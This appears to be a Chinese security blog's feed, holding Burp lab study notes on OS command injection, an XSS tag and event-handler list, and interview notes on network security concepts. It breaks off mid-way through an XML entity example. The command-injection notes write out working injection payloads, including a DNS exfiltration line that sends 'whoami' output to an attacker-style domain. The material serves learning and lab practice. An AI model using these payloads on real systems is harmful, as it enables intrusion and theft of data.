    <content type="html"><![CDATA[<p>记录在做 burp lab 时学会的知识点。<br /><span id="more"></span></p><h1 id="executing-arbitrary-commands"><a class="anchor" href="#executing-arbitrary-commands">#</a> Executing arbitrary commands</h1><p>最基础的 payload<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&amp; echo aiwefwlguh &amp;</span><br><span class="line">1|whoami</span><br></pre></td></tr></table></figure><br />2. 常用指令<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> 应用                      Linux          Windows</span><br><span class="line"> 用户名                  whoami         whoami</span><br><span class="line"> 操作系统              uname -a       ver</span><br><span class="line"> 网络设置              ifconfig              ipconfig /all</span><br><span class="line"> 网络连接              netstat -an         netstat -an</span><br><span class="line"> 进程                     ps -ef          tasklist</span><br></pre></td></tr></table></figure></p><h1 id="detecting-blind-os-command-injection-using-time-delays"><a class="anchor" href="#detecting-blind-os-command-injection-using-time-delays">#</a> Detecting blind OS command injection using time delays</h1><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp; ping -c 10 127.0.0.1 &amp;</span><br><span class="line">|ping+-c+10+127.0.0.1||</span><br></pre></td></tr></table></figure></p><h1 id="exploiting-blind-os-command-injection-by-redirecting-output"><a class="anchor" href="#exploiting-blind-os-command-injection-by-redirecting-output">#</a> Exploiting blind OS command injection by redirecting output</h1><p>配合目录穿越使用<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&amp; whoami &gt; /var/www/static/whoami.txt &amp;</span><br></pre></td></tr></table></figure></p><h1 id="exploiting-blind-os-command-injection-using-out-of-band-oast-techniques"><a class="anchor" href="#exploiting-blind-os-command-injection-using-out-of-band-oast-techniques">#</a> Exploiting blind OS command injection using out-of-band (OAST) techniques</h1><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&amp; nslookup kgji2ohoyw.web-attacker.com &amp;</span><br><span class="line">&amp; nslookup `whoami`.kgji2ohoyw.web-attacker.com &amp;</span><br></pre></td></tr></table></figure></p><h1 id="ways-of-injecting-os-commands"><a class="anchor" href="#ways-of-injecting-os-commands">#</a> Ways of injecting OS commands</h1><ol><li>仅 Unix 系统下使用的分隔符：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">;</span><br><span class="line">Newline (0x0a or \n)</span><br></pre></td></tr></table></figure><br /> 还可以通过以下方式执行命令:<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`injected command`</span><br><span class="line">$(injected command )</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;</summary>
    
    
    
    <category term="web" scheme="http://ericcd.com/categories/web/"/>
    
    
    <category term="web" scheme="http://ericcd.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>BurpLab_5-Business_logic_vulnerabilities</title>
    <link href="http://ericcd.com/2022/12/22/BurpLab-5/"/>
    <id>http://ericcd.com/2022/12/22/BurpLab-5/</id>
    <published>2022-12-22T12:44:54.000Z</published>
    <updated>2023-04-13T03:19:46.851Z</updated>
    
    <content type="html"><![CDATA[<p>记录在做 burp lab 时学会的知识点。<br /><span id="more"></span></p><h1 id="excessive-trust-in-client-side-controls"><a class="anchor" href="#excessive-trust-in-client-side-controls">#</a> Excessive trust in client-side controls</h1><h1 id="failing-to-handle-unconventional-input"><a class="anchor" href="#failing-to-handle-unconventional-input">#</a> Failing to handle unconventional input</h1><p>1.Are there any limits that are imposed on the data?<br />2.What happens when you reach those limits?<br /><span class="exturl" data-url="aHR0cDovLzMuSXM=">3.Is</span> any transformation or normalization being performed on your input?<br />4. 注意边界值和特殊值<br /> 5. 有后端前端不会检测用户输入的长度，后端也只是做了简单的截断处理，可以摸清后端的阶段规律，自定义一个适当长度的字符串，让它被阶段后成为我们的目标字符串</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;</summary>
    
    
    
    <category term="web" scheme="http://ericcd.com/categories/web/"/>
    
    
    <category term="web" scheme="http://ericcd.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XSS_cheet_sheet</title>
    <link href="http://ericcd.com/2022/11/30/XSS-cheet-sheet/"/>
    <id>http://ericcd.com/2022/11/30/XSS-cheet-sheet/</id>
    <published>2022-11-30T06:26:13.000Z</published>
    <updated>2022-11-30T06:29:26.360Z</updated>
    
    <content type="html"><![CDATA[<p>payload 记录。<br /><span id="more"></span><br />1.tags<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">a2</span><br><span class="line">abbr</span><br><span class="line">acronym</span><br><span class="line">address</span><br><span class="line">animate</span><br><span class="line">animatemotion</span><br><span class="line">animatetransform</span><br><span class="line">applet</span><br><span class="line">area</span><br><span class="line">article</span><br><span class="line">aside</span><br><span class="line">audio</span><br><span class="line">audio2</span><br><span class="line">b</span><br><span class="line">bdi</span><br><span class="line">bdo</span><br><span class="line">big</span><br><span class="line">blink</span><br><span class="line">blockquote</span><br><span class="line">body</span><br><span class="line">br</span><br><span class="line">button</span><br><span class="line">canvas</span><br><span class="line">caption</span><br><span class="line">center</span><br><span class="line">cite</span><br><span class="line">code</span><br><span class="line">col</span><br><span class="line">colgroup</span><br><span class="line">command</span><br><span class="line">content</span><br><span class="line">custom tags</span><br><span class="line">data</span><br><span class="line">datalist</span><br><span class="line">dd</span><br><span class="line">del</span><br><span class="line">details</span><br><span class="line">dfn</span><br><span class="line">dialog</span><br><span class="line">dir</span><br><span class="line">div</span><br><span class="line">dl</span><br><span class="line">dt</span><br><span class="line">element</span><br><span class="line">em</span><br><span class="line">embed</span><br><span class="line">fieldset</span><br><span class="line">figcaption</span><br><span class="line">figure</span><br><span class="line">font</span><br><span class="line">footer</span><br><span class="line">form</span><br><span class="line">frame</span><br><span class="line">frameset</span><br><span class="line">h1</span><br><span class="line">head</span><br><span class="line">header</span><br><span class="line">hgroup</span><br><span class="line">hr</span><br><span class="line">html</span><br><span class="line">i</span><br><span class="line">iframe</span><br><span class="line">iframe2</span><br><span class="line">image</span><br><span class="line">image2</span><br><span class="line">image3</span><br><span class="line">img</span><br><span class="line">img2</span><br><span class="line">input</span><br><span class="line">input2</span><br><span class="line">input3</span><br><span class="line">input4</span><br><span class="line">ins</span><br><span class="line">kbd</span><br><span class="line">keygen</span><br><span class="line">label</span><br><span class="line">legend</span><br><span class="line">li</span><br><span class="line">link</span><br><span class="line">listing</span><br><span class="line">main</span><br><span class="line">map</span><br><span class="line">mark</span><br><span class="line">marquee</span><br><span class="line">menu</span><br><span class="line">menuitem</span><br><span class="line">meta</span><br><span class="line">meter</span><br><span class="line">multicol</span><br><span class="line">nav</span><br><span class="line">nextid</span><br><span class="line">nobr</span><br><span class="line">noembed</span><br><span class="line">noframes</span><br><span class="line">noscript</span><br><span class="line">object</span><br><span class="line">ol</span><br><span class="line">optgroup</span><br><span class="line">option</span><br><span class="line">output</span><br><span class="line">p</span><br><span class="line">param</span><br><span class="line">picture</span><br><span class="line">plaintext</span><br><span class="line">pre</span><br><span class="line">progress</span><br><span class="line">q</span><br><span class="line">rb</span><br><span class="line">rp</span><br><span class="line">rt</span><br><span class="line">rtc</span><br><span class="line">ruby</span><br><span class="line">s</span><br><span class="line">samp</span><br><span class="line">script</span><br><span class="line">section</span><br><span class="line">select</span><br><span class="line">set</span><br><span class="line">shadow</span><br><span class="line">slot</span><br><span class="line">small</span><br><span class="line">source</span><br><span class="line">spacer</span><br><span class="line">span</span><br><span class="line">strike</span><br><span class="line">strong</span><br><span class="line">style</span><br><span class="line">sub</span><br><span class="line">summary</span><br><span class="line">sup</span><br><span class="line">svg</span><br><span class="line">table</span><br><span class="line">tbody</span><br><span class="line">td</span><br><span class="line">template</span><br><span class="line">textarea</span><br><span class="line">tfoot</span><br><span class="line">th</span><br><span class="line">thead</span><br><span class="line">time</span><br><span class="line">title</span><br><span class="line">tr</span><br><span class="line">track</span><br><span class="line">tt</span><br><span class="line">u</span><br><span class="line">ul</span><br><span class="line">var</span><br><span class="line">video</span><br><span class="line">video2</span><br><span class="line">wbr</span><br><span class="line">xmp</span><br></pre></td></tr></table></figure></p><p>2.events<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">onafterprint</span><br><span class="line">onafterscriptexecute</span><br><span class="line">onanimationcancel</span><br><span class="line">onanimationend</span><br><span class="line">onanimationiteration</span><br><span class="line">onanimationstart</span><br><span class="line">onauxclick</span><br><span class="line">onbeforecopy</span><br><span class="line">onbeforecut</span><br><span class="line">onbeforeinput</span><br><span class="line">onbeforeprint</span><br><span class="line">onbeforescriptexecute</span><br><span class="line">onbeforeunload</span><br><span class="line">onbegin</span><br><span class="line">onblur</span><br><span class="line">onbounce</span><br><span class="line">oncanplay</span><br><span class="line">oncanplaythrough</span><br><span class="line">onchange</span><br><span class="line">onclick</span><br><span class="line">onclose</span><br><span class="line">oncontextmenu</span><br><span class="line">oncopy</span><br><span class="line">oncuechange</span><br><span class="line">oncut</span><br><span class="line">ondblclick</span><br><span class="line">ondrag</span><br><span class="line">ondragend</span><br><span class="line">ondragenter</span><br><span class="line">ondragleave</span><br><span class="line">ondragover</span><br><span class="line">ondragstart</span><br><span class="line">ondrop</span><br><span class="line">ondurationchange</span><br><span class="line">onend</span><br><span class="line">onended</span><br><span class="line">onerror</span><br><span class="line">onfinish</span><br><span class="line">onfocus</span><br><span class="line">onfocusin</span><br><span class="line">onfocusout</span><br><span class="line">onfullscreenchange</span><br><span class="line">onhashchange</span><br><span class="line">oninput</span><br><span class="line">oninvalid</span><br><span class="line">onkeydown</span><br><span class="line">onkeypress</span><br><span class="line">onkeyup</span><br><span class="line">onload</span><br><span class="line">onloadeddata</span><br><span class="line">onloadedmetadata</span><br><span class="line">onloadend</span><br><span class="line">onloadstart</span><br><span class="line">onmessage</span><br><span class="line">onmousedown</span><br><span class="line">onmouseenter</span><br><span class="line">onmouseleave</span><br><span class="line">onmousemove</span><br><span class="line">onmouseout</span><br><span class="line">onmouseover</span><br><span class="line">onmouseup</span><br><span class="line">onmousewheel</span><br><span class="line">onmozfullscreenchange</span><br><span class="line">onpagehide</span><br><span class="line">onpageshow</span><br><span class="line">onpaste</span><br><span class="line">onpause</span><br><span class="line">onplay</span><br><span class="line">onplaying</span><br><span class="line">onpointerdown</span><br><span class="line">onpointerenter</span><br><span class="line">onpointerleave</span><br><span class="line">onpointermove</span><br><span class="line">onpointerout</span><br><span class="line">onpointerover</span><br><span class="line">onpointerrawupdate</span><br><span class="line">onpointerup</span><br><span class="line">onpopstate</span><br><span class="line">onprogress</span><br><span class="line">onratechange</span><br><span class="line">onrepeat</span><br><span class="line">onreset</span><br><span class="line">onresize</span><br><span class="line">onscroll</span><br><span class="line">onsearch</span><br><span class="line">onseeked</span><br><span class="line">onseeking</span><br><span class="line">onselect</span><br><span class="line">onselectionchange</span><br><span class="line">onselectstart</span><br><span class="line">onshow</span><br><span class="line">onstart</span><br><span class="line">onsubmit</span><br><span class="line">ontimeupdate</span><br><span class="line">ontoggle</span><br><span class="line">ontouchend</span><br><span class="line">ontouchmove</span><br><span class="line">ontouchstart</span><br><span class="line">ontransitioncancel</span><br><span class="line">ontransitionend</span><br><span class="line">ontransitionrun</span><br><span class="line">ontransitionstart</span><br><span class="line">onunhandledrejection</span><br><span class="line">onunload</span><br><span class="line">onvolumechange</span><br><span class="line">onwebkitanimationend</span><br><span class="line">onwebkitanimationiteration</span><br><span class="line">onwebkitanimationstart</span><br><span class="line">onwebkittransitionend</span><br><span class="line">onwheel</span><br></pre></td></tr></table></figure></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;payload 记录。&lt;br /&gt;</summary>
    
    
    
    <category term="web" scheme="http://ericcd.com/categories/web/"/>
    
    
    <category term="web" scheme="http://ericcd.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>面经</title>
    <link href="http://ericcd.com/2022/11/30/hvv/"/>
    <id>http://ericcd.com/2022/11/30/hvv/</id>
    <published>2022-11-30T06:26:13.000Z</published>
    <updated>2023-05-02T12:09:58.210Z</updated>
    
    <content type="html"><![CDATA[<p>面经总结<br /><span id="more"></span></p><h1 id="个人知识扫盲"><a class="anchor" href="#个人知识扫盲">#</a> 个人知识扫盲</h1><p>1.waf<br />Web 应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。</p><p>2.ips<br /> 入侵防御系统 (IPS: Intrusion Prevention System) 是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙 (Packet Filter, Application Gateway) 的补充。 入侵防御系统 (Intrusion-prevention system) 是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够及时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为，能够帮助组织识别恶意流量，并主动阻止此类流量进入其网络。。<br />IPS 一般也是在网络层旁路，可以理解为具备阻断能力的 IDS，是 IDS 的升级版（也有 IDS 检测到攻击通知阻断设备执行阻断动作的设备联动模式），可以覆盖网络层和应用层。</p><p>3.ids<br />IDS（intrusion detection system）入侵检测系统是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。它与其他网络安全设备的不同之处便在于，IDS 是一种积极主动的安全防护技术。<br />IDS 工作在网络层，旁路部署，通过抓取和分析网络流量来发现攻击，主要关注网络层和传输层的数据包，如 IP、TCP、UDP 等协议。<br />产品：奇安信天眼</p><ol start="4"><li><p>旁路部署<br />旁路部署是指安全设备在网络结构中处于旁路状态。在旁路模式下，安全设备只需要连接到交换机的指定镜像端口，所以形象的称之为 “旁路监控”；而串联模式一般是通过网关或者网桥的模式来进行监控，由于监控设备做了网关或者网桥，所以形象的称之为 “串联监控”。<br />旁路部署可以应用于防毒墙、IDS、上网行为审计、流控等很多安全设备。・</p></li><li><p>交换机<br />交换机工作在 OSI 模型的第二层，即数据链路层。 交换机的主要作用是连接多个以太网物理段，隔离冲突域，对以太网帧进行高速而透明的交换转发，自行学习和维护 MAC 地址信息。 希望这能帮到你。</p></li><li><p>路由器<br />路由器属于 OSI 模型的第三层，即网络层。路由器的基本功能是把数据（IP 报文）传送到正确的网络，包括数据报的寻径和传送，子网隔离，抑制广播风暴，维护路由表，并与其它路由器交换路由信息，这是 IP 报文转发的基础，实现对 IP 数据报的过滤和记帐。</p></li><li><p>交换机和路由器之间的关系<br />交换机负责连接网络设备（如交换机、路由器、防火墙、无线 AP 等）和终端设备（如计算机、服务器、摄像头、打印机等）；路由器实现局域网与局域网的互联，局域网与 Internet 的互联。<br />交换机不懂得 IP 地址，但它可以 “学习” MAC 地址，并把其存放在内部地址表中，通过在数据帧的始发者和目标接收者之间建立临时的交换路径，使数据帧直接由源地址到达目的地址。<br />普通的交换机一般工作在 OSI 七层模型的第二层 - 数据链路层，负责局域网之间的连接，而路由器工作在 OSI 的第三层 - 网络层，负责广域网之间的连接。<br />交换机都是根据 MAC 地址转发数据帧，而路由器是基于路由表转发数据包。<br />总而言之，交换机是将不同 IP 地址的电脑连在一起，共享一根网线；路由器是将同一个 IP 给不同的电脑使用，就像一条大路分成很多条小路。一句话，路由器是接外网的，交换机是接内网的。</p></li><li><p>数据包从前端到后端的流程<br />客户端向服务器发起请求，请求会被封装成数据包。数据包会经过客户端的网卡，然后通过网线传输到路由器。路由器会根据目标 IP 地址，将数据包转发到下一个路由器或者直接转发到目标服务器。数据包到达目标服务器后，会被服务器的网卡接收。服务器会对数据包进行解析，然后根据请求内容进行处理。服务器处理完请求后，会将响应结果封装成数据包，然后通过网卡发送回客户端。数据包会经过路由器，然后通过网线传输到客户端的网卡。客户端的网卡接收到数据包后，会将数据包传递给操作系统内核。操作系统内核会对数据包进行解析，然后将响应结果交给应用程序。</p></li></ol><p>9.NAT<br />NAT 是指网络地址转换，是一种网络协议。当在专用网内部的一些主机本来已经分配到了本地 IP 地址（即仅在本专用网内使用的专用地址），但又想和因特网上的主机通信（并不需要加密）时，可使用 NAT 方法。这种方法需要在专用网（私网 IP）连接到因特网（公网 IP）的路由器上安装 NAT 软件。装有 NAT 软件的路由器叫做 NAT 路由器，它至少有一个有效的外部全球 IP 地址（公网 IP 地址）。这样，所有使用本地地址（私网 IP 地址）的主机在和外界通信时，都要在 NAT 路由器上将其本地地址转换成全球 IP 地址，才能和因特网连接。<br />NAT 的实现方式有三种，即静态转换 Static Nat、动态转换 Dynamic Nat 和端口多路复用 OverLoad<br /> 静态转换是指将内部网络的私有 IP 地址转换为公有 IP 地址，IP 地址对是一对一的，是一成不变的，某个私有 IP 地址只转换为某个公有 IP 地址。借助于静态转换，可以实现外部网络对内部网络中某些特定设备（如服务器）的访问。<br />动态转换是指将内部网络的私有 IP 地址转换为公用 IP 地址时，IP 地址是不确定的，是随机的，所有被授权访问上 Internet 的私有 IP 地址可随机转换为任何指定的合法 IP 地址。也就是说，只要指定哪些内部地址可以进行转换，以及用哪些合法地址作为外部地址时，就可以进行动态转换。动态转换可以使用多个合法外部地址集。当 ISP 提供的合法 IP 地址略少于网络内部的计算机数量时。可以采用动态转换的方式。<br />端口多路复用（Port address Translation,PAT）是指改变外出数据包的源端口并进行端口转换，即端口地址转换（PAT，Port Address Translation）. 采用端口多路复用方式。内部网络的所有主机均可共享一个合法外部 IP 地址实现对 Internet 的访问，从而可以最大限度地节约 IP 地址资源。同时，又可隐藏网络内部的所有主机，有效避免来自 internet 的攻击。因此，网络中应用最多的就是端口多路复用方式。例如，假设有两个内部主机 A 和 B，它们都使用私有 IP 地址 192.168.1.1 和 192.168.1.2，并且它们都要访问外部网络。路由器使用公网 IP 地址 203.0.113.1，并且已经配置了 PAT。当主机 A 发送数据包到外部网络时，路由器会将源 IP 地址和源端口号转换为 203.0.113.1:10000，并将数据包发送到外部网络。当主机 B 发送数据包到外部网络时，路由器会将源 IP 地址和源端口号转换为 203.0.113.1:10001，并将数据包发送到外部网络。当外部网络返回数据包时，路由器会根据目标端口号将数据包转发到相应的内部主机。</p><p>10.hids<br />HIDS（主机入侵检测系统）是一种监视计算机或网络中可疑活动的应用程序。监视的活动可以包括外部参与者创建的入侵，也可以包括内部资源或数据的滥用。HIDS 具有监视和分析计算系统内部方面以及其网络接口上的任何传入 / 传出网络数据包的能力。它通过监视操作系统操作、跟踪用户行为并在没有人类干预的情况下独立运行来检测主机上的恶意行为。<br />HIDS 则通过监测主机系统的系统日志、进程状态、文件变化等信息来检测安全事件，主要关注应用层和操作系统层的信息</p><p>11.DOM 型 XSS 和反射型 XSS 的区别<br /> DOM 型 XSS 和反射型 XSS 的区别在于，DOM 型 XSS 不经过服务器，仅通过网页本身的 JavaScript 进行渲染触发，而反射型 XSS 是通过 URL 传递参数，服务器返回响应时，将参数中的恶意脚本代码反射回浏览器执行。DOM 型 XSS 的典型例子是在网页中插入一段恶意脚本代码，然后通过网页本身的 JavaScript 进行渲染触发。反射型 XSS 的典型例子是攻击者构造一个带有恶意脚本代码的 URL，然后将这个 URL 发送给受害者，当受害者点击这个 URL 时，恶意脚本代码就会被执行。</p><ol start="12"><li>内网 ip 和外网 ip 的区别<br />一般来说，10 开头的 IP 都是内网 IP，即 10.0.0.0 到 10.255.255.255 是内网 IP。而以下 IP 段的地址都是内网 IP 地址：172.16.0.0 到 172.31.255.255、192.168.0.0 到 192.168.255.255、169.254.x.x（其中 x.x 为任意数字）。如果您想判断一个 ip 是公网 IP 还是私网 ip，可以登录百度，搜索 IP 得到一个本机的外网 IP。然后打开路由器（确切的说是网关，网关可能是光猫也可能是路由器），然后登陆进入查看 WAN IP，这个是路由器连接上层网络的 IP。若 WAN IP 和百度查到的外网 IP 一致，那么这个就是公网 ip 了。</li></ol><p>13.Kerboeros 协议<br /> Kerberos 协议是一种网络认证协议，用于在计算机网络上进行身份验证。它提供了一种安全的身份验证机制，以防止未经授权的访问。<br />Kerberos 协议的基本原理是：用户向 Kerberos 服务器请求一个票据，该票据用于向其他服务器证明用户的身份。Kerberos 服务器使用用户的密码来生成票据，并将其发送回用户。用户可以使用该票据来访问其他服务器，而无需再次输入密码。<br />通过过滤出 kerboros 流量，我们在 req-body 字段中，可以找到 clientName 的值，表示的就是 pc 的用户名，serverName 的两个字段一个表示服务用户名，一个是就是域名。</p><p>14.DHCP<br />DHCP 协议是一种网络协议，用于在 TCP/IP 网络上分配 IP 地址。DHCP 代表动态主机配置协议。DHCP 协议允许计算机在网络上自动获取 IP 地址，而无需手动配置。DHCP 还提供了其他信息，例如子网掩码、默认网关和 DNS 服务器的地址。DHCP 服务器是负责分配 IP 地址的服务器。DHCP 客户端是需要 IP 地址的计算机。可以帮助识别连接到网络的计算机的主机名、MAC 地址和 IP 地址。在 hostname 字段中可以找到主机名，在 clientMac 字段中可以找到主机的 mac 地址，这样我们就能把主机 - 主机 mac 地址 - IP 地址给关联起来，可以描述出网络中的主机拓扑结构。</p><p>15.dict 协议<br /> Dict 协议是一个在线网络字典协议，这个协议是用来架设一个字典服务的。Dict 服务器和客户机使用 TCP 端口 2628。Dict 协议是基于查询响应的 TCP 协议，它的目标是超越 Webster protocol，并允许客户端在使用过程中访问更多字典 12.</p><p>16.redis 服务<br /> Redis 是一个使用 ANSI C 编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库。它是一种 NoSQL 数据库，具有高性能、可扩展性强、高可用等优点，受到广泛开发人员和仓库管理人员的青睐。Redis 支持分布式，理论上可以无限扩展，是现在最受欢迎的 NoSQL 数据库之一。</p><p>17.gopher 协议<br /> gopher 协议是一个古老且强大的协议，可以理解为是 http 协议的前身，他可以实现多个数据包整合发送。通过 gopher 协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。</p><p>18.xml 文件<br /> XML 是一种用来传输和存储数据的可扩展标记语言。它由三部分组成：XML 文档声明，在文档的第一行；XML 文档类型定义，即 DTD，XXE 漏洞所在的地方；XML 文档元素。<br />XML 的 DTD 实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。<br />内部实体：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p><p>外部实体：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span 